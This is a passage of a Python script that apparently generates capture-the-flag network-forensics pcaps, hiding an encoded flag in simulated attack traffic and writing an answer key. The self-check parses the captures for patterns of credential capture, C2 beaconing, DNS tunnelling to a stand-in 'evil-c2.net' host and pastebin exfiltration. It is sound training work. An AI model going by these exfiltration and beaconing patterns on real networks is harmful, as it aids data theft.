    import base64 as _b64
    target = format_flag(args.wrapper, args.flag).encode()
    xor_key = args.xor.encode() if args.xor else None

    def eff_scheme():
        chal = args.scenario if args.scenario != "none" else args.method
        if chal in ("kerberoast", "dns", "doh-beacon", "dga-beacon"):
            return dns_safe_scheme(args.encode)
        if chal in ("arp-spoof", "c2-beacon", "ssdp-upnp", "malware-chain",
                    "ransomware-note", "pastebin-exfil"):
            return args.encode if args.encode != "none" else "base64"
        if chal == "http" and args.encode == "none":
            return "base64"
        return args.encode

    def undo(enc_bytes):
        try:
            scheme = eff_scheme()
            data = enc_bytes
            if scheme == "base32":
                pad = (-len(data)) % 8
                data = _b64.b32decode(data.upper() + b"=" * pad)
            elif scheme == "base64":
                data = _b64.b64decode(data)
            elif scheme == "hex":
                data = bytes.fromhex(data.decode())
            if xor_key:
                data = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(data))
            return data
        except Exception:
            return b""

    def hit(val):  # plaintext match or decoded match
        return val == target or undo(val) == target

    from scapy.all import Raw as _Raw, DNSQR as _DNSQR, Padding as _Padding
    import re as _re
    # --- scenarios ---
    if args.scenario in ("ftp-creds", "brute-force"):
        for p in pkts:
            if p.haslayer(_Raw) and bytes(p[_Raw].load).startswith(b"PASS "):
                secret = bytes(p[_Raw].load)[5:].split(b"\r")[0]
                if hit(secret):
                    return True
        return False
    if args.scenario == "telnet-creds":
        seen = False
        for p in pkts:
            if not p.haslayer(_Raw):
                continue
            load = bytes(p[_Raw].load)
            if b"Password:" in load:
                seen = True
            elif seen and load.strip():
                if hit(load.strip()):
                    return True
        return False
    if args.scenario == "http-basic":
        for p in pkts:
            if p.haslayer(_Raw) and b"Authorization: Basic " in bytes(p[_Raw].load):
                tok = bytes(p[_Raw].load).split(b"Authorization: Basic ")[1].split(b"\r")[0]
                try:
                    pw = _b64.b64decode(tok).split(b":", 1)[1]
                except Exception:
                    return False
                return hit(pw)
        return False
    if args.scenario == "arp-spoof":
        for p in pkts:
            if p.haslayer(_Padding):
                if hit(bytes(p[_Padding].load)):
                    return True
        return False
    if args.scenario == "port-scan":
        for p in pkts:
            if p.haslayer(_Raw):
                m = _re.search(rb"access token: (\S+)", bytes(p[_Raw].load))
                if m and hit(m.group(1)):
                    return True
        return False
    if args.scenario == "c2-beacon":
        for p in pkts:
            if p.haslayer(_Raw):
                m = _re.search(rb"data=([A-Za-z0-9+/=]+)", bytes(p[_Raw].load))
                if m and undo(m.group(1)) == target:
                    return True
        return False
    if args.scenario == "kerberoast":
        for p in pkts:
            if p.haslayer(_Raw) and p.haslayer(TCP) and p[TCP].dport == 88:
                load = bytes(p[_Raw].load)
                for m in _re.finditer(rb"([a-z0-9]+)\.corp\.local", load):
                    if undo(m.group(1)) == target:
                        return True
        return False
    if args.scenario == "rogue-dhcp":
        for p in pkts:
            if p.haslayer(BOOTP):
                f = bytes(p[BOOTP].file).rstrip(b"\x00")
                if f and hit(f):
                    return True
        return False
    if args.scenario == "ssdp-upnp":
        for p in pkts:
            if p.haslayer(_Raw):
                m = _re.search(rb"sid=([A-Za-z0-9+/=]+)", bytes(p[_Raw].load))
                if m and hit(m.group(1)):
                    return True
        return False
    if args.scenario in ("doh-beacon", "dga-beacon"):
        for p in pkts:
            if args.scenario == "dga-beacon" and p.haslayer(_DNSQR):
                lbl = p[_DNSQR].qname.decode().rstrip(".").split(".")[0].encode()
                if undo(lbl) == target:
                    return True
            if args.scenario == "doh-beacon" and p.haslayer(_Raw):
                m = _re.search(rb"([a-z0-9]+)\.cloudflare-dns\.com", bytes(p[_Raw].load))
                if m:
                    g = m.group(1)
                    for k in range(0, 4):   # trim TLS length byte that may bleed in
                        if undo(g[k:]) == target:
                            return True
        return False
    if args.scenario == "malware-chain":
        for p in pkts:
            if p.haslayer(_Raw):
                m = _re.search(rb'c2key\s*=\s*"([^"]+)"', bytes(p[_Raw].load))
                if m and hit(m.group(1)):
                    return True
        return False
    if args.scenario == "ransomware-note":
        for p in pkts:
            if p.haslayer(_Raw):
                m = _re.search(rb"Personal ID:\s*([A-Za-z0-9+/=]+)", bytes(p[_Raw].load))
                if m and hit(m.group(1)):
                    return True
        return False
    if args.scenario == "pastebin-exfil":
        chunks = {}
        for p in pkts:
            if p.haslayer(_Raw):
                load = bytes(p[_Raw].load)
                mi = _re.search(rb"paste_idx=(\d+)", load)
                md = _re.search(rb"paste_data=([A-Za-z0-9+/=]+)", load)
                if mi and md:
                    chunks[int(mi.group(1))] = md.group(1)
        if chunks:
            enc = b"".join(chunks[k] for k in sorted(chunks))
            return undo(enc) == target
        return False
    
    if args.method == "dns":
        labels = {}
        for p in pkts:
            if p.haslayer(_DNSQR):
                q = p[_DNSQR].qname.decode().rstrip(".")
                if "tunnel.evil-c2.net" in q:
                    parts = q.split(".")
                    labels[int(parts[1])] = parts[0]
        enc = "".join(labels[k] for k in sorted(labels)).encode()
        return undo(enc) == target
    elif args.method in ("split-tcp", "split-icmp"):
        segs = []
        for p in pkts:
            if p.haslayer(_Raw):
                load = bytes(p[_Raw].load)
                if load.startswith(b"SEG"):
                    segs.append((load[3], load[4:]))
        segs.sort()
        enc = b"".join(c for _, c in segs)
        return undo(enc) == target
    elif args.method == "http":
        for p in pkts:
            if p.haslayer(_Raw):
                load = bytes(p[_Raw].load)
                if b"session=" in load and b"GET /dashboard" in load:
                    val = load.split(b"session=")[1].split(b";")[0].split(b"\r")[0]
                    return undo(val) == target
    return False


def main():
    ap = argparse.ArgumentParser(
        description="Generate a realistic network-forensics CTF pcap with a hidden flag.")
    # flag
    ap.add_argument("--flag", default="r34ssembly_1s_fun",
                    help="inner flag text (without the wrapper)")
    ap.add_argument("--wrapper", default=f"{DEFAULT_FLAG_PREFIX}{{FLAG}}",
                    help="flag wrapper; the literal 'FLAG' is replaced by --flag")
    # hiding
    ap.add_argument("--method", default="dns",
                    choices=["dns", "split-tcp", "split-icmp", "http"],
                    help="how the flag is hidden (ignored if --scenario is set)")
    ap.add_argument("--scenario", default="none",
                    choices=["none", "kerberoast", "ftp-creds", "telnet-creds",
                             "http-basic", "arp-spoof", "port-scan", "brute-force",
                             "c2-beacon", "rogue-dhcp", "ssdp-upnp", "doh-beacon",
                             "dga-beacon", "malware-chain", "ransomware-note",
                             "pastebin-exfil"],
                    help="plant an attack signature that also carries the flag")
    ap.add_argument("--encode", default="base32",
                    choices=["none", "hex", "base64", "base32"],
                    help="encoding applied before hiding")
    ap.add_argument("--xor", default="",
                    help="optional XOR key applied before encoding (meatier)")
    ap.add_argument("--decoys", type=int, default=3,
                        help="number of red-herring fake flags to plant")
    ap.add_argument("--decoy-theme", default="spongebob",
                        choices=["spongebob", "cyber", "mixed", "custom"],
                        help="flavor of the fake red-herring flags")
    ap.add_argument("--decoy-words", default="",
                        help="comma-separated words for --decoy-theme custom "
                            "(supplying these auto-selects the custom theme)")
    # noise volumes (sessions; each expands to several packets)
    ap.add_argument("--tcp", type=int, default=12, help="generic TCP service sessions")
    ap.add_argument("--udp", type=int, default=10, help="(maps to DNS service chatter)")
    ap.add_argument("--dns", type=int, default=20, help="DNS query/response exchanges")
    ap.add_argument("--icmp", type=int, default=8, help="ICMP echo/reply pings")
    ap.add_argument("--http", type=int, default=15, help="HTTP request/response sessions")
    ap.add_argument("--https", type=int, default=12, help="TLS-looking HTTPS sessions")
    ap.add_argument("--arp", type=int, default=10, help="ARP who-has/is-at exchanges")
    ap.add_argument("--dhcp", type=int, default=2, help="DHCP DORA handshakes")
    ap.add_argument("--clients", type=int, default=6,
                    help="number of distinct client hosts on the LAN")
    # realism / timing
    ap.add_argument("--subnet", default="10.0.0.0/24")
    ap.add_argument("--jitter", type=float, default=0.35,
                    help="mean idle gap between sessions (seconds)")
    ap.add_argument("--normalize", action="store_true",
                    help="re-space all timestamps evenly for a tidy capture")
    ap.add_argument("--seed", type=int, default=None,
                    help="RNG seed for reproducible challenges")
    # output
    ap.add_argument("-o", "--out", default="challenge",
                    help="output pcap name; .pcap is added automatically")
    ap.add_argument("--answer-key", default="",
                    help="answer-key name; defaults to <out>_answer.txt")
    ap.add_argument("--outdir", default="ChumOutput",
                    help="parent folder for generated challenges (default: ChumOutput)")
    ap.add_argument("--no-subfolder", action="store_true",
                    help="write files to the current directory instead of ChumOutput/<name>/")
    ap.add_argument("--no-check", action="store_true",
                    help="skip the post-generation solvability self-check")
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("-i", "--interactive", action="store_true",
                    help="force the interactive menu even if other flags are given")
    args = ap.parse_args()

    # normalize decoy words; supplying words auto-selects the custom theme
    args.decoy_words = [w.strip() for w in args.decoy_words.split(",") if w.strip()]
    if args.decoy_words and args.decoy_theme == "spongebob":
        args.decoy_theme = "custom"

    # Bare launch (no args) or explicit -i -> interactive menu.
    go_interactive = args.interactive or len(sys.argv) == 1

    if not args.quiet:
        print_banner()

    if not go_interactive:
        generate_once(args)
        return

    # Interactive: keep offering new challenges until the user exits.
    import copy
    base = args
    while True:
        run_args = copy.copy(base)
        run_args = interactive_config(run_args)
        generate_once(run_args)
        if not ask_yesno("\nGenerate another challenge?", True):
            say("\nThanks for chumming the water. See you next tide. \U0001F41F",
                "subtitle")
            break


def generate_once(args):
    """Run a single generation: resolve paths, build, write, self-check, report,
    and print how long it took. Shows a progress bar / heads-up for big captures."""
    import os, time
    t0 = time.perf_counter()

    # force standard extensions; user only supplies a name
    args.out = force_ext(args.out, ".pcap")
    if not args.answer_key:
        args.answer_key = os.path.splitext(args.out)[0] + "_answer.txt"
    else:
        args.answer_key = force_ext(args.answer_key, ".txt")

    # organize everything under ChumOutput/<challenge-name>/ unless the user
    # already gave an explicit path with directories in it
    base = os.path.splitext(os.path.basename(args.out))[0]
    if not args.no_subfolder and os.path.dirname(args.out) in ("", "."):
        out_dir = os.path.join(args.outdir, base)
        os.makedirs(out_dir, exist_ok=True)
        args.out = os.path.join(out_dir, os.path.basename(args.out))
        args.answer_key = os.path.join(out_dir, os.path.basename(args.answer_key))

    # estimate workload and warn for big captures. Packets-per-session differ a
    # lot by protocol (an HTTP page load is ~20+ packets; an ARP exchange is 2).
    _PER = {"arp": 2, "dhcp": 4, "dns": 2, "udp": 2, "icmp": 6,
            "tcp": 10, "https": 13, "http": 22}
    total_sessions = sum(getattr(args, k) for k in
                         ("arp", "dhcp", "tcp", "udp", "dns", "icmp", "http", "https"))
    est_packets = sum(getattr(args, k) * w for k, w in _PER.items()) + args.decoys + 40
    if not args.quiet and est_packets > 75000:
        eta = est_packets / 1500.0   # ~packets/sec on a typical machine
        mins = f"~{eta/60:.1f} min" if eta > 90 else f"~{eta:.0f}s"
        say(f"[!] Heads-up: ~{est_packets:,} packets projected ({mins} to build). "
            f"Large captures are slow to build and write - this is normal, hang tight.",
            "warning")

    # build (with progress bar when rich is available and we're not quiet)
    if _HAS_RICH and not args.quiet and total_sessions > 0:
        from rich.progress import (Progress, SpinnerColumn, BarColumn, TextColumn,
                                   TimeElapsedColumn, MofNCompleteColumn)
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), MofNCompleteColumn(), TimeElapsedColumn(),
                      console=_console, transient=True) as prog:
            task = prog.add_task("Chumming the water", total=total_sessions)
            pkts, solution, net, located = build_challenge(
                args, progress=lambda n: prog.advance(task, n))
            prog.update(task, description="Writing pcap", completed=total_sessions)
            wrpcap(args.out, pkts)
            prog.update(task, description="Verifying")
            ok = None if args.no_check else self_check(pkts, args)
        write_answer_key(args.answer_key, args, solution, len(pkts), located)
    else:
        pkts, solution, net, located = build_challenge(args)
        wrpcap(args.out, pkts)
        write_answer_key(args.answer_key, args, solution, len(pkts), located)
        ok = None if args.no_check else self_check(pkts, args)

    elapsed = time.perf_counter() - t0

    if not args.quiet:
        _eff, _note = effective_encoding(args)
        if _note:
            say(f"[!] Encoding note: {_note}", "warning")
        say(f"[+] Wrote {len(pkts):,} packets to {args.out}", "success")
        say(f"[+] Answer key -> {args.answer_key}", "success")
        say(f"[+] Hosts on LAN: {len(net.clients)} clients + gateway + resolver "
            f"+ {len(net.servers)} servers", "meta")
        say(f"[+] Flag: {format_flag(args.wrapper, args.flag)}", "highlight")
        if ok is True:
            say("[+] Self-check: flag is recoverable from the capture. OK", "success")
        elif ok is False:
            say("[!] Self-check: could NOT recover the flag - review settings!", "error")
        if located:
            say("[+] Flag carrier frame(s): "
                + ", ".join(str(m["frame"]) for m in located), "meta")
        say("[+] Solve path:", "menu_title")
        for i, s in enumerate(solution, 1):
            say(f"      {i}. {s}", "menu_item")
        say(f"[+] Completed in {elapsed:.2f}s "
            f"({len(pkts)/max(elapsed,0.001):,.0f} packets/s)", "success")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # user hit Ctrl-C; exit quietly instead of dumping a stack trace
        say("\nInterrupted - no challenge written. See you next tide. \U0001F41F",
            "warning")
        sys.exit(130)   # 130 = conventional exit code for Ctrl-C
